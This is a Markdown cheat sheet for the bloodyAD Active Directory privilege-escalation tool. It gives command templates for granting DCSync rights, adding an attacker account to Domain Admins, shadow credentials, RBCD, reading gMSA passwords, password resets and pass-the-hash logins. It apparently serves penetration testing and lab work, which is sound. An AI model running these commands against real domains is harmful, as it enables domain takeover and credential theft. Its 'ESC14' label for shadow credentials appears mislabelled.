# bloodyAD Cheat Sheet

A powerful tool for Active Directory privilege escalation via LDAP/SAMR.  
Supports NTLM, Kerberos, and certificate-based authentication without requiring LDAPS.  
GitHub: [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

---

## Installation

```bash
# From PyPi
pip install bloodyAD

# From Source
git clone https://github.com/CravateRouge/bloodyAD
cd bloodyAD
python3 -m venv .venv
source .venv/bin/activate
pip install .
```

---

## Authentication Options

| Flag               | Description                                 |
|--------------------|---------------------------------------------|
| `-u <user>`        | Username (sAMAccountName)                   |
| `-p <password|:NTLM>` | Plaintext password or NTLM hash           |
| `-k`               | Use Kerberos authentication                 |
| `-c <cert.pem>`    | Certificate-based authentication            |
| `-d <domain>`      | Target domain                               |
| `--host`           | DC FQDN or hostname                         |
| `--dc-ip`          | IP of Domain Controller                     |
| `--dns`            | Specify DNS server                          |

Supports cleartext, hashes, Kerberos, and certificates for flexible access.

---

## Command Structure

| Category | Subcommands |
|----------|-------------|
| `get`    | children, dnsDump, membership, object, search, trusts, writable |
| `add`    | computer, dcsync, dnsRecord, genericAll, groupMember, rbcd, shadowCredentials, uac, user |
| `remove` | dcsync, dnsRecord, genericAll, groupMember, object, rbcd, shadowCredentials, uac |
| `set`    | object, owner, password |

```bash
bloodyAD [auth options] <command> <subcommand> [args]
```

---

## GET Commands

```bash
# List child objects
bloodyAD ... get children --target DOMAIN

# Dump DNS records
bloodyAD ... get dnsDump --zone domain.local

# Get user group membership
bloodyAD ... get membership targetUser

# Get object attributes
bloodyAD ... get object gmsa01$ --attr msDS-ManagedPassword

# LDAP search by filter
bloodyAD ... get search --filter "(objectClass=user)" --attr mail

# Check writable objects
bloodyAD ... get writable --otype USER --detail
```

---

## ADD Commands

```bash
# Add DCSync rights
bloodyAD ... add dcsync attackerUser

# Assign GenericAll rights
bloodyAD ... add genericAll "CN=target,CN=Users,DC=domain,DC=local" attacker

# Add user to group
bloodyAD ... add groupMember "Domain Admins" attacker

# Create a computer object
bloodyAD ... add computer NewPC Pass123!

# Add RBCD
bloodyAD ... add rbcd targetSPN attackerUser

# Add shadow credentials (ESC14)
bloodyAD ... add shadowCredentials targetUser --path creds.pem
```

---

## REMOVE Commands

```bash
# Remove DCSync rights
bloodyAD ... remove dcsync attackerUser

# Remove GenericAll
bloodyAD ... remove genericAll "CN=target,CN=Users,DC=domain,DC=local" attacker

# Remove user from group
bloodyAD ... remove groupMember "Domain Admins" attacker

# Remove shadow credentials
bloodyAD ... remove shadowCredentials targetUser
```

---

## SET Commands

```bash
# Change user password
bloodyAD ... set password targetUser NewP@ssw0rd

# Change object owner
bloodyAD ... set owner "CN=object,OU=Org,DC=domain,DC=local" newOwner

# Set specific attribute
bloodyAD ... set object targetUser userPrincipalName -v attacker@domain.local
```

---

## Tips and Extras

- Use `--resolve-sd` with `get object` to view Security Descriptors.
- Combine with BloodHound or `autobloody.py` for attack chaining.
- Pass hashes using `-p :<NTLM>` format.
- Supports base64 or encrypted secret decoding with `-f` flag.

---

## References

- [User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [Examples and Attack Paths](https://github.com/CravateRouge/bloodyAD/wiki/Examples)
- [Authentication Methods](https://github.com/CravateRouge/bloodyAD/wiki/Authentication-Methods)
